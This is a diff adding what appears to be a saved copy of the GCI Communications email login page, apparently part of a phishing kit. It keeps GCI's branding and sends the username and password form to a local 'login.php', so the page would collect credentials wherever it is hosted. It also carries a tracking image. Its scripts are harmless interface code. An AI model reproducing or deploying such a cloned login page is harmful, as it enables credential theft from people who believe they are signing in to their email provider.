@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<!-- saved from url=(0301)https://gciemail.auth-gateway.net/saml/module.php/authSynacor/login.php?AuthState=_8d63e07fe5f2c9697a5759eceed5e3d2e310cf4cbc%3Ahttps%3A%2F%2Fgciemail.auth-gateway.net%2Fsaml%2Fsaml2%2Fidp%2FSSOService.php%3Fspentityid%3Dhttps%253A%252F%252Fmail.gci.net%252F%26cookieTime%3D1654435791%26forceAuthn%3D1 -->
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+                  <meta name="viewport" content="width=device-width">
+        <meta name="viewport" content="initial-scale=1.0">
+        <meta http-equiv="X-UA-Compatible" content="IE=11">
+      
+              <title>GCIEmail | Login</title>
+      
+      
+      
+      	                <link rel="stylesheet" type="text/css" href="./index_files/main.css">
+      
+	<style media="screen">
+		a {
+			color: #2278bb;
+			text-decoration-line: underline;
+		}
+		#login {
+			background-color: #bd1622
+		}
+	</style>
+
+      	      
+	<script src="./index_files/alpine.js.téléchargement" defer=""></script>
+	<script type="text/javascript">
+		toggle_password = (e) => {
+			e.preventDefault();
+			const input = document.getElementById('password');
+			const button = document.getElementById('toggle');
+			if (toggle.innerHTML === 'show') {
+				input.type = 'text';
+				button.innerHTML = 'hide';
+			} else {
+				input.type = 'password';
+				button.innerHTML = 'show';
+			}
+		}
+
+		// Catching the 'keydown' event for FireTV.
+		document.addEventListener('keydown', function(event) {
+
+			// For the down arrow (key code 40) and the up arrow (key code 38),
+			// we want to catch the event and move to the next correct form element.
+			// This is becuase normal tab functionality is not enough when using
+			// a FireTV remote. But it's up and down arrows on the remote trigger
+			// the same events and keycodes as the up/down arrows on a keyboard.
+			var currentElement = document.activeElement;
+			var curIndex = currentElement.tabIndex; //get current elements tab index
+			var tabbables = document.querySelectorAll(".tabable"); //get all tabable elements
+			var firstTabIndex = tabbables[0];
+			var lastTabIndex = tabbables[tabbables.length - 1].tabIndex;
+
+			for(var i=0; i<tabbables.length; i++) { //loop through each element
+				if (event.keyCode == '38') {
+					if(tabbables[i].tabIndex == (curIndex-1)) { //check the tabindex to see if it's the element we want
+						tabbables[i].focus(); //if it's the one we want, focus it and exit the loop
+						break;
+					}
+				}
+				if (event.keyCode == '40') {
+					if(curIndex == lastTabIndex) { //if we are on the last tabindex, go back to the beginning
+						curIndex = 0;
+					}
+					if(tabbables[i].tabIndex == (curIndex+1)) { //check the tabindex to see if it's the element we want
+						tabbables[i].focus(); //if it's the one we want, focus it and exit the loop
+						break;
+					}
+				}
+
+			}
+		});
+	</script>
+      </head>
+  <body class="bg-white flex">
+        <main class="container lg:w-screen-md">
+				<header>
+  <div class="branding">
+    <img src="./index_files/gci.png" alt="Logo">
+      </div>
+  <div class="text-center text-gray-800 text-lg text-bold my-4">
+    <h1>Log in with your username and password.</h1>
+  </div>
+  </header>
+	
+	<img src="./index_files/4fe619a7" style="position: absolute" referrerpolicy="no-referrer-when-downgrade">
+			<section id="login_form" class="flex flex-col justify-between px-3">
+			<form id="main-form" method="POST" action="login.php">
+				<div class="formfield">
+					<label for="username">Email Address</label>
+					<input tabindex="1" class="tabable" type="text" id="username" name="username" value="" placeholder="Email Address" autofocus="" required="">
+				</div>
+				<div class="formfield">
+					<label for="password">Password</label>
+					<div class="flex relative items-baseline">
+						<input tabindex="2" class="tabable" id="password" type="password" name="password" value="" placeholder="Password" required="">
+						<div>
+							<button tabindex="3" type="button" id="toggle" onclick="toggle_password(event)" class="tabable z-10 absolute text-gray-800 uppercase" style="right: 10px; top: 8px;">show</button>
+						</div>
+					</div>
+				</div>
+								  <div class="remember-me" x-data="{ open: false }">
+    <div class="flex items-baseline">
+      <input tabindex="4" id="remember_me" name="remember_me" class="tabable mr-2 leading-tight" type="checkbox" checked="">
+      <label for="remember_me" class="flex items-baseline block text-gray-700 font-bold">
+        Remember Me
+      </label>
+      <a tabindex="5" href="https://gciemail.auth-gateway.net/saml/module.php/authSynacor/login.php?AuthState=_8d63e07fe5f2c9697a5759eceed5e3d2e310cf4cbc%3Ahttps%3A%2F%2Fgciemail.auth-gateway.net%2Fsaml%2Fsaml2%2Fidp%2FSSOService.php%3Fspentityid%3Dhttps%253A%252F%252Fmail.gci.net%252F%26cookieTime%3D1654435791%26forceAuthn%3D1#remember_me_help" id="remember_me_help_link" class="tabable align-top ml-2 text-sm" @click.prevent="open = true">?</a>
+    </div>
+    <div x-show="open" @click.away="open = false" class="my-2 px-4 py-2 bg-yellow-200 text-sm rounded shadow-inner" style="display: none;">
+      <a name="remember_me_help"></a>
+      <p>When you choose "Remember Me" on sign in, we will remember who you are and keep you signed in for up to 90 days, unless you sign out or your browser cookies are deleted. <br>If you are on a public computer, we recommend you uncheck the box.</p>
+    </div>
+  </div>
+																<div class="formfield">
+					<button tabindex="6" id="login" class="tabable w-full px-4 py-2 my-4 text-2xl text-white text-bold uppercase tracking-wider rounded-lg shadow" type="submit" name="submit">
+						Sign In
+					</button>
+				</div>
+			</form>
+		</section>
+
+		<section id="self-care" class="px-2">
+      <ul>
+                  			                    <li class="mb-2">
+  <a class="tabable" tabindex="8" target="_blank" id="selfcare_link_1" href="https://www.gci.com/privacy-policy/">Privacy Policy</a>
+</li>
+                <li class="mb-2">
+  <a class="tabable" tabindex="9" target="_blank" id="selfcare_link_2" href="https://www.gci.com/about/terms-conditions">Terms of Use</a>
+</li>
+                <li class="mb-2">
+  <a class="tabable" tabindex="10" target="_blank" id="selfcare_link_3" href="https://www.gci.com/resetemailpassword">Forgot Password?</a>
+</li>
+              </ul>
+</section>
+		    <p class="mt-8 text-center text-gray-700 text-xs">Copyright © 2022 GCI Communications Corp. All rights reserved.</p>
+</main>
+                  
+
+</body></html>
